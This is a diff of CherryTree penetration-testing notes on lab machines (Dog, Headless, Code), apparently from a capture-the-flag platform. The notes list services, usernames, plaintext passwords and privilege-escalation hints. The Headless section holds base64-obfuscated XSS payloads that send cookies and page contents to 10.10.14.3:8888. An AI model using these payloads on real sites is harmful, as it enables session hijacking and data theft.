@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="4" master_id="0" name="Easy" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="212" is_bold="0" foreground="" ts_creation="1739539367" ts_lastsave="1741189863">
+  <node unique_id="4" master_id="0" name="Easy" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="212" is_bold="0" foreground="" ts_creation="1739539367" ts_lastsave="1742748685">
     <rich_text scale="h1">Keeper</rich_text>
     <rich_text>
 
@@ -215,5 +215,115 @@ history -&gt; tmux -&gt; </rich_text>
 -  Flask 2.0.2
 
 </rich_text>
+    <rich_text scale="h1">Dog</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">Web</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h3">tech</rich_text>
+    <rich_text>
+- Apache[2.4.41]
+- Backdrop 1
+
+</rich_text>
+    <rich_text scale="h3">Struct</rich_text>
+    <rich_text>
+- </rich_text>
+    <rich_text link="webs http://10.10.11.58/?q=FUZZ">http://10.10.11.58/?q=FUZZ</rich_text>
+    <rich_text>
+- /core/ ?
+- /profiles/
+- /files/
+- /.git/
+
+</rich_text>
+    <rich_text scale="h2">User</rich_text>
+    <rich_text>
+- dogBackDropSystem
+- tiffany
+- root
+- rosa
+- axel
+- morris
+- john
+- jobert
+- jPAdminB
+
+</rich_text>
+    <rich_text scale="h2">Pass</rich_text>
+    <rich_text>
+- BackDropJ2024DS2024
+
+</rich_text>
+    <rich_text scale="h2">Maybe Useful</rich_text>
+    <rich_text>
+
+protected $hostname = 'localhost';
+core/modules/simpletest/tests/filetransfer.test-6-  protected $username = 'backdrop';
+core/modules/simpletest/tests/filetransfer.test:7:  protected $password = 'password';
+core/modules/simpletest/tests/filetransfer.test-8-  protected $port = '42';
+
+</rich_text>
+    <rich_text scale="h2">Privesc</rich_text>
+    <rich_text>
+
+johncusack:BackDropJ2024DS2024
+
+</rich_text>
+    <rich_text scale="h1">Headless</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">SSH</rich_text>
+    <rich_text>
+openSSH 9.2p1 Debian
+
+</rich_text>
+    <rich_text scale="h2">Web 5000</rich_text>
+    <rich_text>
+Werkzeug httpd 2.2.2 
+Python 3.11.2
+
+</rich_text>
+    <rich_text scale="h3">XSS</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#e6e6e6">'"&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;</rich_text>
+    <rich_text>&lt;svg/onload=eval(atob("eGhyPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHIub3BlbigiR0VUIiwiaHR0cDovLzEwLjEwLjE0LjM6ODg4OC8iKTt4aHIuc2VuZCgpOw=="));&gt;
+</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#e6e6e6">'"&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;</rich_text>
+    <rich_text>&lt;svg/onload=eval(atob("eGhyPW5ldyBYTUxIdHRwUmVxdWVzdDt4aHIub3BlbigiR0VUIiwiaHR0cDovLzEwLjEwLjE0LjM6ODg4OC8/Yz0iK2J0b2EoZG9jdW1lbnQuY29va2llKSk7eGhyLnNlbmQoKTs="));&gt;
+
+function b(){sr
+=new XMLHttpRequest;sr.open("GET","</rich_text>
+    <rich_text link="webs http://10.10.14.3:8888/?c">http://10.10.14.3:8888/?c</rich_text>
+    <rich_text>"+btoa(this.responseText));sr.send();};xhr=new XMLHttpRequest;xhr.open("[METHOD]","[URL]");xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xhr.withCredentials=true;xhr.onload=b;xhr.send("application/x-www-form-urlencoded");
+
+</rich_text>
+    <rich_text scale="h2">Privesc</rich_text>
+    <rich_text>
+sudo -l -&gt; sudo binary
+file ./initdb.sh in the code 
+→ create a file with the same name and a shell
+
+</rich_text>
+    <rich_text scale="h1">Code</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text scale="h2">Web 5000</rich_text>
+    <rich_text>
+
+- Gunicorn 20.0.4
+- Jquery 3.6.0
+- Ace 1.4.12
+
+</rich_text>
+    <rich_text scale="h2">Privesc</rich_text>
+    <rich_text>
+martin: nafeelswordsmaster</rich_text>
   </node>
 </cherrytree>
